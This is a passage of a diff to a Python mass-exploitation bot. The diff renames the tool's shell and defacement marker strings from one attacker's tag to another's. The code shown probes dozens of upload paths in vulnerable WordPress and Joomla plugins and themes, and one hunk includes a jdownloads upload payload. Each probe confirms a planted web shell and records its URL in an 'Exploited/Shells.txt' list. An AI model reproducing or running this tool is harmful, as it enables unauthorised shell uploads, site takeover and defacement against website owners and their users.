+			if 'MarGusFRom1337School' in acflib.content:
 				print '\033[92m[>] \033[0mExploit Frontend    \033[92m[Done]  '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/uigen_.year./'+filenames+'\n')
 				sys.exit()
@@ -2724,7 +2687,7 @@ def botv1():
 			sonzsxylib = requests.get(url+'/wp-content/themes/konzept/includes/uploadify/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzsxylib.content:
+			if 'MarGusFRom1337School' in sonzsxylib.content:
 				print '\033[92m[>] \033[0mExploit Konzept    \033[92m[Done]  '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/konzept/includes/uploadify/Vuln.php'+'\n')
 				sys.exit()
@@ -2741,7 +2704,7 @@ def botv1():
 			acfxlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in acfxlib.content:
+			if 'MarGusFRom1337School' in acfxlib.content:
 				print '\033[92m[>] \033[0mExploit RightNow    \033[92m[Done]  '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
 				sys.exit()
@@ -2759,7 +2722,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/plugins/pitchprint/uploader/files/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Pitchprint  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/pitchprint/uploader/files/'+filenames+'\n')
 				sys.exit()
@@ -2777,7 +2740,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/plugins/omni-secure-files/plupload/examples/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Secure Files  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/omni-secure-files/plupload/examples/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2795,7 +2758,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/$year/$month/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Cubed_v1.2  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/$year/$month/'+filenames+'\n')
 				sys.exit()
@@ -2812,7 +2775,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/i-dump-uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit iPhone Photo Uploader  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/i-dump-uploads/'+filenames+'\n')
 				sys.exit()
@@ -2830,7 +2793,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/user_uploads/test/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Nmedia  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/user_uploads/test/'+filenames+'\n')
 				sys.exit()
@@ -2847,7 +2810,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-admin/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit File Upload  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-admin/'+filenames+'\n')
 				sys.exit()
@@ -2864,7 +2827,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/themes/MoneyTheme/uploads/uploads/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit oneyTheme Themes XSS  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/MoneyTheme/uploads/uploads/'+filenames+'\n')
 				sys.exit()
@@ -2882,7 +2845,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/wp-checkout/uploadify/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Checkout  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/wp-checkout/uploadify/'+filenames+'\n')
 				sys.exit()
@@ -2899,7 +2862,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/plugins/logosware-suite-uploader/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Logosware  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/logosware-suite-uploader/'+filenames+'\n')
 				sys.exit()
@@ -2916,7 +2879,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/themes/betheme/muffin-options/fields/upload/Files/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Betheme  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/betheme/muffin-options/fields/upload/Files/'+filenames+'\n')
 				sys.exit()
@@ -2935,7 +2898,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/themes/multimedia1/server/php/files/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Multimedia1  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/themes/multimedia1/server/php/files/'+filenames+'\n')
 				sys.exit()
@@ -2953,7 +2916,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/20/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit WP_User_Frontend  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/20/'+filenames+'\n')
 				sys.exit()
@@ -2970,7 +2933,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Pagelines  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/'+filenames+'\n')
 				sys.exit()
@@ -2987,7 +2950,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Addblockblocker  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/'+filenames+'\n')
 				sys.exit()
@@ -3003,7 +2966,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/blaze/uploadfolder/big/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit blaze  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/blaze/uploadfolder/big/'+filenames+'\n')
 				sys.exit()
@@ -3019,7 +2982,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/$year/$month/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit viral optins  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/$year/$month/'+filenames+'\n')
 				sys.exit()
@@ -3035,7 +2998,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/uploads/2019/07/'+indexxx)
 			
 			
-			if 'Hacked By Mister Spy' in aaReflexlib.content:
+			if 'Hacked By MarGus' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit viral optins Index \033[92m[Done] '.format(sn)
 				open('Exploited/index.txt', 'a').write(url+'/wp-content/uploads/2019/07/'+indexxx+'\n')
 				sys.exit()
@@ -3051,7 +3014,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Cherry Plugin  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames+'\n')
 				sys.exit()
@@ -3067,7 +3030,7 @@ def botv1():
 			zoklib = requests.get(url+'/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zoklib.content:
+			if 'MarGusFRom1337School' in zoklib.content:
 				print '\033[92m[>] \033[0mExploit purevision  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/'+filenames+'\n')
 				sys.exit()
@@ -3083,7 +3046,7 @@ def botv1():
 			bblib = requests.get(url+'/wp-content/uploads/levoslideshow/42_uploadfolder/big/'+filenames)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bblib.content:
+			if 'MarGusFRom1337School' in bblib.content:
 				print '\033[92m[>] \033[0mExploit levoslideshow  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/wp-content/uploads/levoslideshow/42_uploadfolder/big/'+filenames+'\n')
 				sys.exit()
@@ -4051,7 +4014,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/Manager.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Joomla RCE  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/Manager.php'+'\n')
 				sys.exit()
@@ -4067,7 +4030,7 @@ def botv1():
 				
 			req_rce = requests.get(url+'/up.php?Mah')
 				
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019_Ye' in req_rce.content:
+			if 'MarGusFRom1337School_Ye' in req_rce.content:
 				
 				print '\033[92m[>] \033[0mExploit Rce  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/up.php?Mah'+'\n')
@@ -4103,7 +4066,7 @@ def botv1():
 							
 							check_shells = requests.get(url+'/components/com_foxcontact/'+filenames)
 							
-							if 'MisterSpyShellForV7Bot0X_istanbul_2019' in check_shells:
+							if 'MarGusFRom1337School' in check_shells:
 								print '\033[92m[>] \033[0mExploit Com_Foxcontact  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg, ids)
 								open('Exploited/shells.txt', 'a').write(url+'/components/com_foxcontact/'+filenames)
 							else:
@@ -4130,7 +4093,7 @@ def botv1():
 			fgGravkglib = requests.get(url+'/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in fgGravkglib.content:
+			if 'MarGusFRom1337School' in fgGravkglib.content:
 				print '\033[92m[>] \033[0mExploit Com_Jce  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
 				sys.exit()
@@ -4143,12 +4106,12 @@ def botv1():
 			zttappgravkg  = {'name':'Owner Tn', 
 			'mail':'spinningarrix@gmail.com', 
 			'catlist':'1',
-			'filetitle':"Vulnerability! MisterSpyShellForV7Bot0X_istanbul_2019",
-			'description':"<p>Vulnerability! MisterSpyShellForV7Bot0X_istanbul_2019</p>",
+			'filetitle':"Vulnerability! MarGusFRom1337School",
+			'description':"<p>Vulnerability! MarGusFRom1337School</p>",
 			'2d1a8f3bd0b5cf542e9312d74fc9766f':1,
 			'send':1,
 			'senden':"Send file",
-			'description':"<p>Vulnerability! MisterSpyShellForV7Bot0X_istanbul_2019</p>",
+			'description':"<p>Vulnerability! MarGusFRom1337School</p>",
 			'option':"com_jdownloads", 
 			'view':"upload"}
 			
@@ -4161,7 +4124,7 @@ def botv1():
 			zttGravkglib = requests.get(url+'/images/jdownloads/screenshots/'+com_jdownloads)
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zttGravkglib.content:
+			if 'MarGusFRom1337School' in zttGravkglib.content:
 				print '\033[92m[>] \033[0mExploit Com_Jdownloads \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/'+com_jdownloads+'\n')
 				sys.exit()
@@ -4193,7 +4156,7 @@ def botv1():
 			Gravkglib = requests.get(url+'/media/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravkglib.content:
+			if 'MarGusFRom1337School' in Gravkglib.content:
 				print '\033[92m[>] \033[0mExploit Com_Fabrik  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/media/up.php'+'\n')
 				sys.exit()
@@ -4212,7 +4175,7 @@ def botv1():
 			aaReflexlib = requests.get(url+'/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aaReflexlib.content:
+			if 'MarGusFRom1337School' in aaReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Fabrik2  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
 				sys.exit()
@@ -4233,7 +4196,7 @@ def botv1():
 			xaynzfeReflexlib = requests.get(url+'/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in xaynzfeReflexlib.content:
+			if 'MarGusFRom1337School' in xaynzfeReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Oziogallery  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
 				sys.exit()
@@ -4255,7 +4218,7 @@ def botv1():
 			axaynzfeReflexlib = requests.get(url+'/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in axaynzfeReflexlib.content:
+			if 'MarGusFRom1337School' in axaynzfeReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Oziogallery2  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
 				sys.exit()
@@ -4274,7 +4237,7 @@ def botv1():
 			aReflexlib = requests.get(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in aReflexlib.content:
+			if 'MarGusFRom1337School' in aReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Jbcatalog  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php'+'\n')
 				sys.exit()
@@ -4291,7 +4254,7 @@ def botv1():
 			bReflexlib = requests.get(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bReflexlib.content:
+			if 'MarGusFRom1337School' in bReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Mod_Socialpinboard_Menu  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/mod_socialpinboard_menu/images/socialpinboard/temp/up.php'+'\n')
 				sys.exit()
@@ -4314,7 +4277,7 @@ def botv1():
 			Gravlib = requests.get(url+'/tmp/plupload/shell.jpg')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravlib.content:
+			if 'MarGusFRom1337School' in Gravlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Adsmanager  \033[92m[Done] '.format(sn)
 				open('Exploited/shell.txt', 'a').write(url+'/tmp/plupload/shell.jpg'+'\n')
 				sys.exit()
@@ -4330,7 +4293,7 @@ def botv1():
 			Gravklib = requests.get(url+'/components/com_b2jcontact/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Gravklib.content:
+			if 'MarGusFRom1337School' in Gravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_B2jcontact  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/components/com_b2jcontact/Vuln.php'+'\n')
 				sys.exit()
@@ -4350,7 +4313,7 @@ def botv1():
 			Reflexlib = requests.get(url+'/com_sexycontactform/fileupload/files/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Reflexlib.content:
+			if 'MarGusFRom1337School' in Reflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Sexycontactform  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/com_sexycontactform/fileupload/files/up.php'+'\n')
 				sys.exit()
@@ -4371,7 +4334,7 @@ def botv1():
 			sonzsxylib = requests.get(url+'/up.php.xxxjpg')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in sonzsxylib.content:
+			if 'MarGusFRom1337School' in sonzsxylib.content:
 				print '\033[92m[>] \033[0mExploit Com_Myblog  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php.xxxjpg'+'\n')
 				sys.exit()
@@ -4391,7 +4354,7 @@ def botv1():
 			bGravlib = requests.get(url+'/images/stories/up.php.xxxjpg')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in bGravlib.content:
+			if 'MarGusFRom1337School' in bGravlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Rokdownloads  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/images/stories/up.php.xxxjpg'+'\n')
 				sys.exit()
@@ -4411,7 +4374,7 @@ def botv1():
 			dsbGravlib = requests.get(url+'/up.php.xxxjpg')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dsbGravlib.content:
+			if 'MarGusFRom1337School' in dsbGravlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Simplephotogallery  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/up.php.xxxjpg'+'\n')
 				sys.exit()
@@ -4431,7 +4394,7 @@ def botv1():
 			cbGravlib = requests.get(url+'/images/stories/shell.php.xxxjpg')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in cbGravlib.content:
+			if 'MarGusFRom1337School' in cbGravlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Extplorer  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/images/stories/up.php.xxxjpg'+'\n')
 				sys.exit()
@@ -4450,7 +4413,7 @@ def botv1():
 			cbGravlib = requests.get(url+'/modules/megamenu/uploadify/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in cbGravlib.content:
+			if 'MarGusFRom1337School' in cbGravlib.content:
 				print '\033[92m[>] \033[0mExploit Megamenu Uploadify  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/megamenu/uploadify/up.php'+'\n')
 				sys.exit()
@@ -4467,7 +4430,7 @@ def botv1():
 			eReflexlib = requests.get(url+'/modules/mod_simplefileuploadv1.3/elements/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in eReflexlib.content:
+			if 'MarGusFRom1337School' in eReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Mod_Simplefileuploadv1  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/modules/mod_simplefileuploadv1.3/elements/up.php'+'\n')
 				sys.exit()
@@ -4484,7 +4447,7 @@ def botv1():
 			feReflexlib = requests.get(url+'/administrator/components/com_bt_portfolio/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in feReflexlib.content:
+			if 'MarGusFRom1337School' in feReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Bt_Portfolio  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_bt_portfolio/up.php'+'\n')
 				sys.exit()
@@ -4501,7 +4464,7 @@ def botv1():
 			zfeReflexlib = requests.get(url+'/jwallpapers_files/plupload/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zfeReflexlib.content:
+			if 'MarGusFRom1337School' in zfeReflexlib.content:
 				print '\033[92m[>] \033[0mExploit jJwallpapers_Files  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/jwallpapers_files/plupload/up.php'+'\n')
 				sys.exit()
@@ -4517,7 +4480,7 @@ def botv1():
 			dzfeReflexlib = requests.get(url+'/administrator/components/com_redmystic/chart/tmp-upload-images/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dzfeReflexlib.content:
+			if 'MarGusFRom1337School' in dzfeReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Redmystic  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_redmystic/chart/tmp-upload-images/Vuln.php'+'\n')
 				sys.exit()
@@ -4536,7 +4499,7 @@ def botv1():
 			nzfeReflexlib = requests.get(url+'/components/com_facileforms/libraries/jquery/up.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in nzfeReflexlib.content:
+			if 'MarGusFRom1337School' in nzfeReflexlib.content:
 				print '\033[92m[>] \033[0mExploit Com_Facileforms  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/components/com_facileforms/libraries/jquery/up.php'+'\n')
 				sys.exit()
@@ -4552,7 +4515,7 @@ def botv1():
 			wGravklib = requests.get(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in wGravklib.content:
+			if 'MarGusFRom1337School' in wGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Civicrm  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/Vuln.php'+'\n')
 				sys.exit()
@@ -4568,7 +4531,7 @@ def botv1():
 			ewGravklib = requests.get(url+'/administrator/components/com_maian15/charts/tmp-upload-images/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in ewGravklib.content:
+			if 'MarGusFRom1337School' in ewGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Maian15  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_maian15/charts/tmp-upload-images/Vuln.php'+'\n')
 				sys.exit()
@@ -4586,7 +4549,7 @@ def botv1():
 			awGravklib = requests.get(url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in awGravklib.content:
+			if 'MarGusFRom1337School' in awGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Acymailing  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_acymailing/inc/openflash/tmp-upload-images/Vuln.php'+'\n')
 				sys.exit()
@@ -4603,7 +4566,7 @@ def botv1():
 			dawGravklib = requests.get(url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in dawGravklib.content:
+			if 'MarGusFRom1337School' in dawGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Jnewsletter  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/Vuln.php'+'\n')
 				sys.exit()
@@ -4620,7 +4583,7 @@ def botv1():
 			xdawGravklib = requests.get(url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in xdawGravklib.content:
+			if 'MarGusFRom1337School' in xdawGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Jinc  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_jinc/classes/graphics/tmp-upload-images/Vuln.php'+'\n')
 				sys.exit()
@@ -4637,7 +4600,7 @@ def botv1():
 			zxdawGravklib = requests.get(url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
+			if 'MarGusFRom1337School' in zxdawGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Maianmedia  \033[92m[Done] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/Vuln.php'+'\n')
 				sys.exit()
@@ -4654,7 +4617,7 @@ def botv1():
 			zxdawGravklib = requests.get(url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
+			if 'MarGusFRom1337School' in zxdawGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com_Jnews  \033[91m[Failed] '.format(sn)
 				open('Exploited/Shells.txt', 'a').write(url+'/administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/Vuln.php'+'\n')
 				sys.exit()
@@ -4827,7 +4790,7 @@ def botv1():
 				
 				shell_jd = requests.get(url+'/images/jdownloads/screenshots/up.php3.g')
 			
-				if 'MisterSpyShellForV7Bot0X_istanbul_2019' in shell_jd.content:
+				if 'MarGusFRom1337School' in shell_jd.content:
 					
 					print '\033[92m[>] \033[0mExploit com_jdownloads  \033[92m[Done] '.format(sn)
 					open('Exploited/Shells.txt', 'a').write(url+'/images/jdownloads/screenshots/up.php3.g'+'\n')
@@ -4853,7 +4816,7 @@ def botv1():
 					
 					Shell_jbcatalog = requests.get(url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+str(filename))
 					
-					if 'MisterSpyShellForV7Bot0X_istanbul_2019' in Shell_jbcatalog.content:
+					if 'MarGusFRom1337School' in Shell_jbcatalog.content:
 						print '\033[92m[>] \033[0mExploit Com_Jbcatalog  \033[92m[Done] '.format(sn)
 						open('Exploited/Shells.txt', 'a').write(url+'/com_jbcatalog/libraries/jsupload/server/php/files/'+str(filename)+'\n')
 						
@@ -4874,7 +4837,7 @@ def botv1():
 				
 				check_lib = requests.get(url+'/components/'+filename)
 				
-				if 'MisterSpyShellForV7Bot0X_istanbul_2019' in check_lib.content:			
+				if 'MarGusFRom1337School' in check_lib.content:			
 					print '\033[92m[>] \033[0mExploit Com_B2j2  \033[92m[Done] '.format(sn)
 					open('Exploited/Shells.txt', 'a').write(url+'/components/'+filename+'\n')
 							
@@ -4900,7 +4863,7 @@ def botv1():
 					
 					check_shell = requests.get(url+"/tmp/plupload/"+filename)
 					
-					if 'MisterSpyShellForV7Bot0X_istanbul_2019' in check_shell.content:
+					if 'MarGusFRom1337School' in check_shell.content:
 					
 						print '\033[92m[>] \033[0mExploit Com_Adsmanager2  \033[92m[Done] '.format(sn)
 						open('Exploited/Shells.txt', 'a').write(url+"/tmp/plupload/"+filename+'\n')
@@ -4933,7 +4896,7 @@ def botv1():
 					check_shell = requests.get(site)
 					
 					
-					if 'MisterSpyShellForV7Bot0X_istanbul_2019' in check_shell.content:
+					if 'MarGusFRom1337School' in check_shell.content:
 						print '\033[92m[>] \033[0mExploit Com_Myblog  \033[92m[Done] '.format(sn)
 						open('Exploited/Shells.txt', 'a').write(site+'\n')
 						
@@ -4953,7 +4916,7 @@ def botv1():
 			zxdawGravklib = requests.get(url+'/components/com_agora/img/members/0/Vuln.php')
 			
 			
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in zxdawGravklib.content:
+			if 'MarGusFRom1337School' in zxdawGravklib.content:
 				print '\033[92m[>] \033[0mExploit Com Agora  \033[92m[Done] '.format(sn)
